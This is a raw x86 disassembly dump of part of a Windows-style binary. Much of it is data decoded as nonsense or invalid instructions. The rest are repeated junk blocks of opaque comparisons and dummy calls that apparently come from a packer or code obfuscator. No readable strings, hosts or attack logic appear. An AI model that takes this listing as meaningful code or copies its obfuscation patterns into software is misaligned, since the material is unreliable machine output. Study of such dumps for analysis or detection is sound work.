  401860:	add    al,0xa4
  401862:	lahf   
  401863:	jmp    FWORD PTR [edx-0x11]
  401866:	repz in eax,dx
  401868:	sbb    dh,al
  40186a:	cwde   
  40186b:	ud0    edx,DWORD PTR [edi-0x46]
  40186f:	popa   
  401870:	sbb    DWORD PTR [edi-0x4a],esp
  401873:	in     al,0xb5
  401875:	shl    BYTE PTR [ecx+0x40add5a6],1
  40187b:	sar    DWORD PTR [edx-0x6d045427],cl
  401881:	adc    al,0xa8
  401883:	loopne 0x401896
  401885:	aad    0xf
  401887:	xchg   esi,eax
  401888:	popa   
  401889:	je     0x40183d
  40188b:	leave  
  40188c:	xor    BYTE PTR [ecx+0x7e],dl
  40188f:	ds mov bh,0xee
  401892:	dec    ebp
  401893:	call   0x2c6d:0x7411aab8
  40189a:	or     DWORD PTR [bp+si],edx
  40189d:	xchg   esp,eax
  40189e:	loope  0x4018e3
  4018a0:	es or  edx,esi
  4018a3:	dec    eax
  4018a4:	test   BYTE PTR [esp+ebp*8-0x8],dh
  4018a8:	imul   edx,DWORD PTR [ebx],0x81b0bd9
  4018ae:	ret    0xdad2
  4018b1:	int3   
  4018b2:	(bad)
  4018b6:	leave  
  4018b7:	jno    0x401916
  4018b9:	ds push es
  4018bb:	mov    ds:0x4a91d3bc,al
  4018c0:	jl     0x4018aa
  4018c2:	jne    0x4018e2
  4018c4:	outs   dx,DWORD PTR ds:[esi]
  4018c5:	dec    ebx
  4018c6:	pop    ecx
  4018c7:	dec    ecx
  4018c8:	icebp  
  4018c9:	jge    0x4018a2
  4018cb:	ret    0xdaf3
  4018ce:	stc    
  4018cf:	sbb    dh,al
  4018d1:	(bad)  [esi-0x2904bc9c]
  4018d7:	fmul   st(4),st
  4018d9:	cmp    ebp,DWORD PTR [eax]
  4018db:	lahf   
  4018dc:	jmp    FWORD PTR [ebx-0x52]
  4018df:	inc    edi
  4018e0:	fidiv  DWORD PTR [ebx-0x51]
  4018e3:	dec    esp
  4018e4:	jae    0x40188e
  4018e6:	ret    
  4018e7:	fstp   DWORD PTR [ebx]
  4018e9:	add    BYTE PTR [edx+eiz*1-0x533a745f],ch
  4018f0:	fwait
  4018f1:	and    al,0x62
  4018f3:	jmp    0x401912
  4018f5:	stos   DWORD PTR es:[edi],eax
  4018f6:	pusha  
  4018f7:	clc    
  4018f8:	or     DWORD PTR [edi+0x4e],0xffffffe3
  4018fc:	lds    esi,FWORD PTR [esi]
  4018fe:	sub    bl,0x25
  401901:	or     BYTE PTR [edx-0x2],bh
  401904:	inc    ebx
  401905:	outs   dx,DWORD PTR ds:[esi]
  401906:	sbb    BYTE PTR [edx-0x18c992c3],ah
  40190c:	xchg   edx,eax
  40190d:	sbb    DWORD PTR [ebx],ecx
  40190f:	lods   eax,DWORD PTR ds:[esi]
  401910:	pop    esi
  401911:	jnp    0x40192a
  401913:	cld    
  401914:	mov    cl,0x53
  401916:	cmp    ebp,esp
  401918:	ins    BYTE PTR es:[edi],dx
  401919:	pop    ss
  40191a:	test   DWORD PTR [ebp-0x596a0988],edi
  401920:	lods   eax,DWORD PTR ds:[esi]
  401921:	out    dx,al
  401922:	in     eax,0x54
  401924:	xlat   BYTE PTR ds:[ebx]
  401925:	jp     0x4018fb
  401927:	js     0x268ac583
  40192d:	sbb    edi,DWORD PTR [ecx-0x6c]
  401930:	cmp    ecx,DWORD PTR [ebp+0x46]
  401933:	sub    eax,edx
  401935:	mov    edx,0x31ab
  40193a:	mov    DWORD PTR [ebp-0x58],eax
  40193d:	sbb    ecx,edi
  40193f:	cmp    DWORD PTR ds:0x428287,0x0
  401946:	not    DWORD PTR ds:0x4282ff
  40194c:	mov    edi,DWORD PTR ds:0x4281a3
  401952:	mov    DWORD PTR ds:0x42829f,edi
  401958:	jmp    0x4019ab
  40195d:	mov    DWORD PTR ds:0x42830b,0x77e1
  401967:	not    edi
  401969:	cmp    DWORD PTR ds:0x428287,0x0
  401970:	jge    0x401993
  401976:	push   0x637b
  40197b:	call   DWORD PTR ds:0x428d8c
  401981:	mov    edx,DWORD PTR ds:0x4283a7
  401987:	adc    DWORD PTR ds:0x42830f,edx
  40198d:	and    edx,DWORD PTR ds:0x42825f
  401993:	add    DWORD PTR ds:0x42828f,edx
  401999:	mov    edi,DWORD PTR ds:0x428183
  40199f:	xor    DWORD PTR ds:0x4281ab,edi
  4019a5:	and    DWORD PTR ds:0x42817b,ecx
  4019ab:	mov    DWORD PTR [ebp-0x54],ecx
  4019ae:	mov    ecx,DWORD PTR ds:0x42838b
  4019b4:	sub    ecx,DWORD PTR ds:0x42828b
  4019ba:	mov    DWORD PTR ds:0x42838b,ecx
  4019c0:	or     DWORD PTR [ebp-0x58],0xca78b059
  4019c7:	sbb    DWORD PTR ds:0x42839b,edx
  4019cd:	or     DWORD PTR [ebp-0x54],0x9c1b89e8
  4019d4:	adc    edx,edx
  4019d6:	lea    eax,[ebp+0x20]
  4019d9:	mov    DWORD PTR [ebp-0xc],eax
  4019dc:	mov    DWORD PTR ds:0x428393,0x339b
  4019e6:	mov    eax,ds:0x4223e0
  4019eb:	cmp    DWORD PTR ds:0x428277,0x0
  4019f2:	mov    edx,0x5699
  4019f7:	movzx  edx,BYTE PTR ds:0x428287
  4019fe:	mov    edi,0xa42
  401a03:	jmp    0x401a5a
  401a08:	not    edi
  401a0a:	mov    edi,0x2eea
  401a0f:	cmp    DWORD PTR ds:0x428277,0x0
  401a16:	jg     0x401a44
  401a1c:	push   0x3b91
  401a21:	push   0x428297
  401a26:	push   DWORD PTR [ebp-0x1c]
  401a29:	push   0x478c
  401a2e:	call   DWORD PTR ds:0x428e78
  401a34:	adc    ecx,ecx
  401a36:	sbb    ecx,DWORD PTR ds:0x428197
  401a3c:	neg    edx
  401a3e:	adc    ecx,DWORD PTR ds:0x428187
  401a44:	sub    DWORD PTR ds:0x428313,ecx
  401a4a:	add    DWORD PTR ds:0x428193,0x42828b
  401a54:	xor    edx,DWORD PTR ds:0x4282fb
  401a5a:	mov    ecx,DWORD PTR [ebp-0xc]
  401a5d:	mov    eax,DWORD PTR [eax]
  401a5f:	add    eax,DWORD PTR [ecx]
  401a61:	sub    DWORD PTR ds:0x4281a3,edi
  401a67:	mov    edi,0x329e695d
  401a6c:	mov    DWORD PTR [ebp-0x14],eax
  401a6f:	inc    edx
  401a70:	mov    eax,DWORD PTR [ebp+0x18]
  401a73:	cmp    DWORD PTR ds:0x4281a3,0x0
  401a7a:	mov    edx,DWORD PTR ds:0x428277
  401a80:	mov    edx,0x3ce6
  401a85:	mov    DWORD PTR ds:0x42832f,0xa37
  401a8f:	jmp    0x401ae6
  401a94:	mov    DWORD PTR ds:0x42827b,0x206f
  401a9e:	cmp    DWORD PTR ds:0x4281a3,0x0
  401aa5:	jg     0x401ac8
  401aab:	push   0x47a2
  401ab0:	push   0x8c73
  401ab5:	push   0x8ece
  401aba:	call   DWORD PTR ds:0x428d90
  401ac0:	sub    edx,DWORD PTR ds:0x4283b3
  401ac6:	or     edx,ecx
  401ac8:	sub    ecx,0x6960
  401ace:	mov    ecx,DWORD PTR ds:0x42839f
  401ad4:	adc    ecx,DWORD PTR ds:0x42818f
  401ada:	mov    DWORD PTR ds:0x42839f,ecx
  401ae0:	xor    edx,DWORD PTR ds:0x42818b
  401ae6:	mov    ecx,DWORD PTR [ebp+0x1c]
  401ae9:	shrd   eax,ecx,0x2
  401aed:	cmp    DWORD PTR ds:0x428173,0x0
  401af4:	mov    edx,0x4200
  401af9:	mov    DWORD PTR ds:0x428287,0x6ba0
  401b03:	mov    DWORD PTR ds:0x42819f,0x1855
  401b0d:	jmp    0x401b6b
  401b12:	mov    DWORD PTR ds:0x42817f,0x2fa6
  401b1c:	cmp    DWORD PTR ds:0x428173,0x0
  401b23:	jge    0x401b53
  401b29:	push   DWORD PTR [ebp-0x28]
  401b2c:	push   DWORD PTR [ebp-0x20]
  401b2f:	push   0x672f
  401b34:	call   DWORD PTR ds:0x428ee0
  401b3a:	movzx  edx,WORD PTR ds:0x4282af
  401b41:	and    edx,DWORD PTR ds:0x42818b
  401b47:	mov    DWORD PTR ds:0x4282af,edx
  401b4d:	and    DWORD PTR ds:0x428267,edx
  401b53:	add    DWORD PTR ds:0x4283ab,edx
  401b59:	sub    edx,DWORD PTR ds:0x4282b3
  401b5f:	add    DWORD PTR ds:0x42826b,edi
  401b65:	or     edx,DWORD PTR ds:0x428397
  401b6b:	shr    ecx,0x2
  401b6e:	mov    ecx,DWORD PTR [ebp+0x18]
  401b71:	cmp    DWORD PTR ds:0x42831b,0x0
  401b78:	mov    DWORD PTR ds:0x4282b3,0x3b05
  401b82:	mov    edx,0x7243
  401b87:	mov    DWORD PTR ds:0x428183,0x6e0d
  401b91:	jmp    0x401bec
  401b96:	mov    edx,0x2e5f
  401b9b:	mov    edx,DWORD PTR ds:0x428257
  401ba1:	cmp    DWORD PTR ds:0x42831b,0x0
  401ba8:	je     0x401be0
  401bae:	push   DWORD PTR [ebp-0x18]
  401bb1:	push   DWORD PTR [ebp-0x20]
  401bb4:	push   DWORD PTR [ebp-0x10]
  401bb7:	push   0x15fe
  401bbc:	push   0x400000
  401bc1:	call   DWORD PTR ds:0x428da4
  401bc7:	sub    DWORD PTR ds:0x428307,ecx
  401bcd:	movzx  edx,WORD PTR ds:0x42826b
  401bd4:	add    DWORD PTR ds:0x428317,edx
  401bda:	add    DWORD PTR ds:0x42816f,ebx
  401be0:	sbb    DWORD PTR ds:0x42823f,edi
  401be6:	inc    DWORD PTR ds:0x42823f
  401bec:	mov    edx,DWORD PTR [ebp+0x1c]
  401bef:	xor    eax,edi
  401bf1:	xor    edx,edx
  401bf3:	or     DWORD PTR ds:0x4283a3,0x428247
  401bfd:	or     edx,eax
  401bff:	jmp    0x401fdd
  401c04:	xchg   ebp,eax
  401c05:	xchg   ecx,eax
  401c06:	je     0x401c58
  401c08:	ins    BYTE PTR es:[edi],dx
  401c09:	sub    al,0x2d
  401c0b:	dec    esp
  401c0c:	and    eax,0xdab0afeb
  401c11:	lods   eax,DWORD PTR ds:[esi]
  401c12:	cdq    
  401c13:	mov    esp,0x18180a25
  401c18:	sahf   
  401c19:	adc    bl,BYTE PTR [eax]
  401c1b:	sbb    BYTE PTR [eax-0x6f],bh
  401c1e:	or     al,0xdf
  401c20:	add    DWORD PTR [ecx+0x5c],edx
  401c23:	fwait
  401c24:	xchg   edi,eax
  401c25:	xor    BYTE PTR [ebp+0x75],ch
  401c28:	pop    ecx
  401c29:	jge    0x401c1f
  401c2b:	inc    edi
  401c2c:	sar    DWORD PTR [ebp+0x38],1
  401c2f:	adc    esp,edi
  401c31:	cmp    al,0x1f
  401c33:	sub    eax,0xb117ac54
  401c38:	jle    0x401c9d
  401c3a:	retf   0x5862
  401c3d:	sub    ch,bl
  401c3f:	adc    bh,bh
  401c41:	pop    esp
  401c42:	xchg   esp,eax
  401c43:	adc    dl,al
  401c45:	fcmovne st,st(4)
  401c47:	sub    ch,BYTE PTR [edi+0x4fb49152]
  401c4d:	enter  0x303c,0x4f
  401c51:	add    edx,DWORD PTR [ecx-0x4e]
  401c54:	add    dh,BYTE PTR [edi-0x2483dca6]
  401c5a:	adc    al,0xd1
  401c5c:	fistp  WORD PTR ds:0x449b6c14
  401c62:	cmc    
  401c63:	pop    esi
  401c64:	or     edi,DWORD PTR [esi]
  401c66:	push   ds
  401c67:	cmp    eax,0x6c2030b7
  401c6c:	add    al,0x96
  401c6e:	mov    WORD PTR [edi+0x5fcbc65c],es
  401c74:	hlt    
  401c75:	in     al,dx
  401c76:	or     ebp,DWORD PTR [ebp+0x47]
  401c79:	mov    ds:0x9a016139,al
  401c7e:	pop    eax
  401c7f:	mov    BYTE PTR [eax-0x6a],ah
  401c82:	ins    DWORD PTR es:[edi],dx
  401c83:	xchg   ebp,eax
  401c84:	mov    ebp,edi
  401c86:	sbb    esp,edx
  401c88:	popa   
  401c89:	mov    gs,ebp
  401c8b:	mov    ch,0x67
  401c8d:	jecxz  0x401c95
  401c8f:	hlt    
  401c90:	jo     0x401d08
  401c92:	fsub   st(6),st
  401c94:	and    eax,0x9fdf6219
  401c99:	dec    DWORD PTR [edi]
  401c9b:	mov    esi,0x8a19d4a
  401ca0:	std    
  401ca1:	imul   edi,esp,0xffffff9f
  401ca4:	add    BYTE PTR [ecx+0x71],ah
  401ca7:	pusha  
  401ca8:	or     al,0x35
  401caa:	je     0x401c92
  401cac:	pop    ds
  401cad:	(bad)  
  401cae:	xchg   esp,eax
  401caf:	pop    edx
  401cb0:	ret    0x462e
  401cb3:	jo     0x401caa
  401cb5:	sub    DWORD PTR es:[eax+edx*1],esi
  401cb9:	out    dx,al
  401cba:	or     bl,BYTE PTR [edi-0x4d223c0d]
  401cc0:	add    dh,BYTE PTR [ebp+0x4]
  401cc3:	inc    edi
  401cc4:	rcr    ah,0x65
  401cc7:	pop    ecx
  401cc8:	rcl    BYTE PTR [edi],0x39
  401ccb:	xlat   BYTE PTR ds:[ebx]
  401ccc:	out    dx,al
  401ccd:	(bad)  
  401cce:	out    0x35,al
  401cd0:	sbb    eax,DWORD PTR [ebx]
  401cd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cd3:	push   edi
  401cd4:	add    al,0x15
  401cd6:	xchg   edi,eax
  401cd7:	sbb    DWORD PTR [esi+0x195556a2],ebp
  401cdd:	xlat   BYTE PTR ds:[ebx]
  401cde:	bound  edi,QWORD PTR es:[edi-0x7195db28]
  401ce5:	dec    eax
  401ce6:	js     0x401d09
  401ce8:	shl    BYTE PTR [ebx+0x5a],0x91
  401cec:	loope  0x401d31
  401cee:	out    dx,eax
  401cef:	mov    DWORD PTR [edx+0x3fd4ac55],0xa9003c6e
  401cf9:	mov    ?,WORD PTR [edi+0x2]
  401cfc:	mov    ds:0xbf0c1fc2,al
  401d01:	(bad)  
  401d02:	rcr    ah,1
  401d04:	bound  esi,QWORD PTR [ebx]
  401d06:	push   0x47
  401d08:	jle    0x401c92
  401d0a:	mov    al,ds:0xac00e288
  401d0f:	jmp    0x665675a0
  401d14:	leave  
  401d15:	push   eax
  401d16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d17:	sahf   
  401d18:	xor    eax,0x66a4fdb3
  401d1d:	ins    DWORD PTR es:[edi],dx
  401d1e:	pop    ss
  401d1f:	push   0x604493df
  401d24:	(bad)  
  401d25:	ficomp DWORD PTR [ebx-0x5b61d404]
  401d2b:	(bad)  
  401d2c:	pushf  
  401d2d:	ja     0x401cc0
  401d2f:	hlt    
  401d30:	sbb    BYTE PTR [edx-0x35b91c87],ch
  401d36:	call   0x7bad068e
  401d3b:	mov    cl,0x5
  401d3d:	pop    eax
  401d3e:	call   0x21f5:0x158d1f46
  401d45:	jae    0x401d34
  401d47:	sub    eax,DWORD PTR [ebp+0x57a4f3e5]
  401d4d:	jae    0x401dc9
  401d4f:	in     al,0x8
  401d51:	mov    esi,0x71f13c6d
  401d56:	jne    0x401d1c
  401d58:	lock dec edi
  401d5a:	pop    edi
  401d5b:	jb     0x401d84
  401d5d:	and    al,0x24
  401d5f:	mov    ah,0xea
  401d61:	inc    esp
  401d62:	call   0xc507389f
  401d67:	sub    DWORD PTR [ebx-0x341e9b6c],0x2d4353d
  401d71:	or     ch,dh
  401d73:	sbb    al,0xfb
  401d75:	call   0x2b446f5b
  401d7a:	sbb    ecx,DWORD PTR [esi-0x186c7ee8]
  401d80:	mov    DWORD PTR [ebx+0x76],esp
  401d83:	add    bl,BYTE PTR [esi-0x25199cd0]
  401d89:	in     al,dx
  401d8a:	push   edi
  401d8b:	js     0x401df4
  401d8d:	iret   
  401d8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d8f:	test   BYTE PTR [ecx+edi*4+0x79],cl
  401d93:	push   ss
  401d94:	data16 je 0x401e00
  401d97:	pop    esp
  401d98:	mov    ebx,0x916b59ce
  401d9d:	mov    esi,0x9219260a
  401da2:	pop    ss
  401da3:	xlat   BYTE PTR ds:[ebx]
  401da4:	(bad)  
  401da5:	mov    al,ds:0xd720d49e
  401daa:	out    0x8a,al
  401dac:	cmp    al,0x32
  401dae:	pop    edi
  401daf:	mov    eax,0xe39c085b
  401db4:	push   edi
  401db5:	test   al,0x87
  401db7:	dec    eax
  401db8:	xlat   BYTE PTR ds:[ebx]
  401db9:	pop    es
  401dba:	sub    DWORD PTR [esi],eax
  401dbc:	hlt    
  401dbd:	cdq    
  401dbe:	jp     0x401e05
  401dc0:	aas    
  401dc1:	sub    eax,0x70dbf540
  401dc6:	sub    ch,BYTE PTR [ebp+0x27428b35]
  401dcc:	into   
  401dcd:	sub    eax,DWORD PTR [edx]
  401dcf:	std    
  401dd0:	outs   dx,DWORD PTR ds:[esi]
  401dd1:	and    eax,0xc43aa3f1
  401dd6:	fcomp  DWORD PTR [edi]
  401dd8:	inc    edx
  401dd9:	adc    BYTE PTR [ebx],bl
  401ddb:	inc    edi
  401ddc:	adc    bh,dh
  401dde:	(bad)  
  401ddf:	les    ecx,FWORD PTR ds:0x83f915c6
  401de5:	(bad)  
  401de7:	vpandn ymm3,ymm2,ymm3
  401deb:	xor    ah,BYTE PTR [esi+ecx*1+0x443c6caf]
  401df2:	in     eax,0x13
  401df4:	fdivr  st,st(6)
  401df6:	call   0xd6f4:0x1218741
  401dfd:	push   0x65b526ce
  401e02:	mul    DWORD PTR [edx-0x5f3a5b90]
  401e08:	lea    ebx,ds:0x295526a5
  401e0e:	sub    DWORD PTR [edi],esi
  401e10:	cmc    
  401e11:	out    dx,al
  401e12:	sti    
  401e13:	(bad)  
  401e14:	mov    dl,0x92
  401e16:	jae    0x401dd1
  401e18:	inc    ebp
  401e19:	pop    esi
  401e1a:	retf   0xd8a8
  401e1d:	into   
  401e1e:	cmp    eax,0xaf79752a
  401e23:	les    esp,FWORD PTR [edi+0x5cd2eb97]
  401e29:	ret    
  401e2a:	dec    edx
  401e2b:	push   cs
  401e2c:	push   esp
  401e2d:	mov    ebx,0xf8ee08b9
  401e32:	and    al,0xcf
  401e34:	fucomip st,st(4)
  401e36:	mov    eax,ds:0x39a59d82
  401e3b:	jg     0x401e37
  401e3d:	(bad)  
  401e3e:	leave  
  401e3f:	and    bh,BYTE PTR [esi]
  401e41:	sahf   
  401e42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e43:	pop    edi
  401e44:	pushf  
  401e45:	jl     0x401e4c
  401e47:	ret    
  401e48:	loop   0x401e5f
  401e4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e4b:	loopne 0x401e3b
  401e4d:	std    
  401e4e:	loop   0x401e6c
  401e50:	int    0x51
  401e52:	mov    bh,BYTE PTR [ebp+0x2c]
  401e55:	mov    ecx,ss
  401e57:	fcom   DWORD PTR [ebp+0x73]
  401e5a:	call   0x9b887524
  401e5f:	(bad)  
  401e60:	cmc    
  401e61:	fbld   TBYTE PTR [edi-0x6f]
  401e64:	mov    ch,0xc1
  401e66:	cld    
  401e67:	adc    al,0x96
  401e69:	loope  0x401ea1
  401e6b:	mov    ch,0x55
  401e6d:	not    BYTE PTR [edx+0x12]
  401e70:	mov    ds:0x9b5426de,al
  401e75:	add    eax,ebx
  401e77:	xchg   DWORD PTR [esi+edx*4],esp
  401e7a:	push   0x1f
  401e7c:	iret   
  401e7d:	hlt    
  401e7e:	jmp    0x401e02
  401e80:	sbb    eax,0x6b9b6ba0
  401e85:	repz sub edi,DWORD PTR [ebp+eiz*2+0x17e08e37]
  401e8d:	jecxz  0x401ed1
  401e8f:	push   esp
  401e90:	in     eax,0xc4
  401e92:	lea    esp,[ebx+ebp*8]
  401e95:	ins    DWORD PTR es:[edi],dx
  401e96:	xor    ecx,DWORD PTR [eax-0x41edbe2f]
  401e9c:	(bad)  
  401e9d:	aam    0x70
  401e9f:	cmp    cl,BYTE PTR [eax+0x7a2fefcf]
  401ea5:	cs out 0xc7,al
  401ea8:	call   0x9704dcaa
  401ead:	cld    
  401eae:	or     ebp,DWORD PTR [ecx+0x70]
  401eb1:	sub    al,0x84
  401eb3:	or     ch,BYTE PTR [eax+ecx*2-0x1f]
  401eb7:	mov    esp,0x5856b664
  401ebc:	addr16 sbb al,0x42
  401ebf:	inc    esp
  401ec0:	addr16 fdivp st(2),st
  401ec3:	sub    ah,BYTE PTR [edx-0x57a5c1a2]
  401ec9:	(bad)
  401ecd:	pop    esi
  401ece:	repz rcr BYTE PTR [edi+0xe5c74bf],1
  401ed5:	xor    cl,al
  401ed7:	mov    bh,0xee
  401ed9:	outs   dx,DWORD PTR ds:[esi]
  401eda:	ror    BYTE PTR [esi-0x6cfa6b7c],0x42
  401ee1:	popf   
  401ee2:	adc    ah,dl
  401ee4:	sbb    eax,0x76395fea
  401ee9:	jnp    0x401e8b
  401eeb:	sub    esp,0x41
  401eee:	xchg   esi,eax
  401eef:	int    0xe1
  401ef1:	popf   
  401ef2:	lods   eax,DWORD PTR ds:[esi]
  401ef3:	loope  0x401eb5
  401ef5:	and    BYTE PTR [ecx+ebp*8],ah
  401ef8:	push   ebx
  401ef9:	dec    ecx
  401efa:	and    BYTE PTR ds:0x43f89ab,dl
  401f00:	rol    BYTE PTR [ebx],cl
  401f02:	pop    esp
  401f03:	jg     0x401f3c
  401f05:	out    dx,eax
  401f06:	arpl   WORD PTR [edi-0x4f691d68],si
  401f0c:	popa   
  401f0d:	jb     0x401e9f
  401f0f:	push   0x9
  401f11:	pop    esi
  401f12:	sbb    eax,0x1eee2c1f
  401f17:	pop    ds
  401f18:	fldcw  WORD PTR [ebp+eax*2-0xc3fddc8]
  401f1f:	cmp    BYTE PTR [edx+edx*2+0x48],0x37
  401f24:	fcomp  DWORD PTR [ebp+eax*1-0x34eb58b9]
  401f2b:	loop   0x401eea
  401f2d:	les    esp,FWORD PTR [ecx-0x4626c97a]
  401f33:	pop    ecx
  401f34:	out    0xf7,al
  401f36:	loope  0x401f43
  401f38:	mov    ebp,0x46421d59
  401f3d:	scas   al,BYTE PTR es:[edi]
  401f3e:	push   0xfabe8588
  401f43:	stc    
  401f44:	std    
  401f45:	cmp    eax,0x115aaaeb
  401f4a:	rcl    BYTE PTR [eax],1
  401f4c:	test   DWORD PTR [edx+edx*1-0x7db58960],esp
  401f53:	pop    edi
  401f54:	mov    cl,0x37
  401f56:	rol    DWORD PTR [ecx-0x354fa4],1
  401f5c:	adc    dh,cl
  401f5e:	jp     0x401f02
  401f60:	or     DWORD PTR [esp+esi*2],0x20899625
  401f67:	add    esi,DWORD PTR ds:[edi+0x43]
  401f6b:	pop    esi
  401f6c:	(bad)  
  401f6d:	dec    esi
  401f6e:	inc    edx
  401f6f:	pusha  
  401f70:	lock dec ebp
  401f72:	call   0x2b8e:0xe0a512f2
  401f79:	inc    edi
  401f7a:	imul   edi,DWORD PTR [ecx],0x7d
  401f7d:	mov    eax,ds:0x2ac160f9
  401f82:	jne    0x401fb5
  401f84:	mulps  xmm4,XMMWORD PTR [ebx+0x46]
  401f88:	adc    eax,0xee56b413
  401f8d:	adc    eax,ebp
  401f8f:	mov    ch,0xdf
  401f91:	sbb    eax,0x26beb14a
  401f96:	dec    ecx
  401f97:	push   cs
  401f98:	fnstsw WORD PTR [ebx-0x695afe40]
  401f9e:	jns    0x401f31
  401fa0:	xchg   edi,eax
  401fa1:	xchg   ebp,eax
  401fa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fa3:	in     al,dx
  401fa4:	mov    eax,0xdf073346
  401fa9:	imul   DWORD PTR [esi*8-0x6d7e6990]
  401fb0:	sbb    BYTE PTR cs:[ebp+0x1c3c4273],cl
  401fb7:	div    bh
  401fb9:	jne    0x401f8c
  401fbb:	mov    eax,DWORD PTR [ebp+0x5b32063e]
  401fc1:	fbstp  TBYTE PTR [esi]
  401fc3:	add    eax,DWORD PTR fs:[esi]
  401fc6:	mov    dh,0x6c
  401fc8:	es xor eax,0xaff44997
  401fce:	cmp    BYTE PTR ds:0x1c5fde03,ch
  401fd4:	adc    al,0xee
  401fd6:	repnz sub al,0xf1
  401fd9:	leave  
  401fda:	dec    ecx
  401fdb:	dec    edi
  401fdc:	mov    BYTE PTR [ecx+0x45c7c455],cl
  401fe2:	nop
  401fe3:	push   ebp
  401fe4:	sub    al,0x0
  401fe6:	add    BYTE PTR [ecx+0x42837b],ah
  401fec:	adc    DWORD PTR ds:0x4283b7,eax
  401ff2:	mov    DWORD PTR [ebp-0x6c],0x456f
  401ff9:	cmp    DWORD PTR ds:0x42839b,0x0
  402000:	mov    DWORD PTR ds:0x42829b,0x4df8
  40200a:	mov    DWORD PTR ds:0x428383,0x33aa
  402014:	jmp    0x402076
  402019:	mov    eax,0x569b
  40201e:	mov    eax,0x2370
  402023:	cmp    DWORD PTR ds:0x42839b,0x0
  40202a:	jbe    0x40205c
  402030:	push   DWORD PTR [ebp-0xc]
  402033:	push   0x3ea9
  402038:	call   DWORD PTR ds:0x428da8
  40203e:	or     DWORD PTR ds:0x42817f,0x6f29
  402048:	xor    DWORD PTR ds:0x42831b,0x42830f
  402052:	add    DWORD PTR ds:0x42829b,0x428337
  40205c:	and    DWORD PTR ds:0x4283ab,edi
  402062:	mov    DWORD PTR ds:0x42828b,0x2a04
  40206c:	sub    DWORD PTR ds:0x4281ab,0x42816b
  402076:	mov    DWORD PTR [ebp-0x70],0x78a6
  40207d:	cmp    DWORD PTR ds:0x4282ff,0x0
  402084:	mov    DWORD PTR ds:0x4282fb,ecx
  40208a:	mov    DWORD PTR ds:0x4281a7,0x59f
  402094:	mov    DWORD PTR ds:0x4281a7,ecx
  40209a:	mov    DWORD PTR ds:0x428327,0x5800
  4020a4:	jmp    0x402119
  4020a9:	mov    eax,0x445d
  4020ae:	cmp    DWORD PTR ds:0x4282ff,0x0
  4020b5:	ja     0x4020ec
  4020bb:	push   0x42817b
  4020c0:	push   DWORD PTR [ebp-0x10]
  4020c3:	push   0x842c
  4020c8:	call   DWORD PTR ds:0x428ee4
  4020ce:	sbb    DWORD PTR ds:0x42838b,0x4ff2
  4020d8:	xor    DWORD PTR ds:0x42830b,0x42827f
  4020e2:	adc    DWORD PTR ds:0x42837f,0x4c73
  4020ec:	add    DWORD PTR ds:0x42837f,0x4283af
  4020f6:	and    DWORD PTR ds:0x428167,0x428383
  402100:	sbb    DWORD PTR ds:0x42816b,0x5f9d
  40210a:	sbb    DWORD PTR ds:0x4282ff,0x4282af
  402114:	sbb    eax,0x5252
  402119:	mov    DWORD PTR [ebp-0x6c],0x188
  402120:	neg    eax
  402122:	mov    DWORD PTR [ebp-0x70],0x5b3f
  402129:	mov    DWORD PTR [ebp-0x6c],0x3219
  402130:	mov    DWORD PTR [ebp-0x70],0x231c
  402137:	mov    eax,ds:0x4282fb
  40213c:	add    DWORD PTR ds:0x428297,eax
  402142:	mov    DWORD PTR [ebp-0x6c],0x1337
  402149:	mov    eax,ds:0x42838b
  40214e:	add    DWORD PTR ds:0x428327,eax
  402154:	mov    DWORD PTR [ebp-0x70],0x7593
  40215b:	cmp    DWORD PTR ds:0x428177,0x0
  402162:	mov    DWORD PTR ds:0x42839b,0x750f
  40216c:	not    DWORD PTR ds:0x428383
  402172:	jmp    0x4021e4
  402177:	mov    DWORD PTR ds:0x42827b,0x610f
  402181:	mov    eax,ds:0x42818f
  402186:	cmp    DWORD PTR ds:0x428177,0x0
  40218d:	jle    0x4021c5
  402193:	push   0x428079
  402198:	push   DWORD PTR [ebp-0x28]
  40219b:	push   0x1818
  4021a0:	push   DWORD PTR [ebp-0x18]
  4021a3:	push   0x8e39
  4021a8:	push   DWORD PTR [ebp-0x1c]
  4021ab:	call   DWORD PTR ds:0x428e80
  4021b1:	adc    DWORD PTR ds:0x42829f,0x428273
  4021bb:	add    DWORD PTR ds:0x42825f,0x168f
  4021c5:	sub    DWORD PTR ds:0x428303,0x4281a3
  4021cf:	or     DWORD PTR ds:0x4283a3,0xa53
  4021d9:	mov    eax,ds:0x428257
  4021de:	xor    DWORD PTR ds:0x42816b,eax
  4021e4:	mov    DWORD PTR [ebp-0x6c],0x11b8
  4021eb:	xor    eax,0x39f6
  4021f0:	jmp    0x4025ce
  4021f5:	stos   DWORD PTR es:[edi],eax
  4021f6:	fisttp QWORD PTR [edi+0x32]
  4021f9:	aas    
  4021fa:	and    ch,BYTE PTR [edx-0x2c2c85a4]
  402200:	mov    esp,0xbc6564d1
  402205:	stos   DWORD PTR es:[edi],eax
  402206:	add    bl,BYTE PTR [eax]
  402208:	sbb    BYTE PTR [esi-0x5ee7e7ee],bl
  40220e:	sub    al,0x3f
  402210:	fbstp  TBYTE PTR [ebp+0x5f693d4c]
  402216:	sbb    edi,ecx
  402218:	es adc eax,0xd725fc3f
  40221e:	mov    eax,ebx
  402220:	scas   al,BYTE PTR es:[edi]
  402221:	in     al,0xa6
  402223:	stos   BYTE PTR es:[edi],al
  402224:	cmc    
  402225:	test   DWORD PTR [ebp+0x5e128656],ebp
  40222b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40222c:	lea    esi,[edx-0x64446a14]
  402232:	ret    
  402233:	mov    WORD PTR [edi],fs
  402235:	mov    ss,eax
  402237:	repz mov edx,DWORD PTR [ebx]
  40223a:	inc    esp
  40223b:	repz push ss
  40223d:	or     al,0x6a
  40223f:	inc    ecx
  402240:	jecxz  0x402229
  402242:	gs mov eax,0x91ce702b
  402248:	shl    DWORD PTR [ecx],1
  40224a:	or     eax,0xeec6d947
  40224f:	push   eax
  402250:	mov    esi,0xecf2387
  402255:	adc    edx,DWORD PTR [edi-0x80]
  402258:	(bad)  
  402259:	pop    edi
  40225a:	sub    al,0x8
  40225c:	add    esi,ebx
  40225e:	sbb    al,0x80
  402260:	or     al,0x87
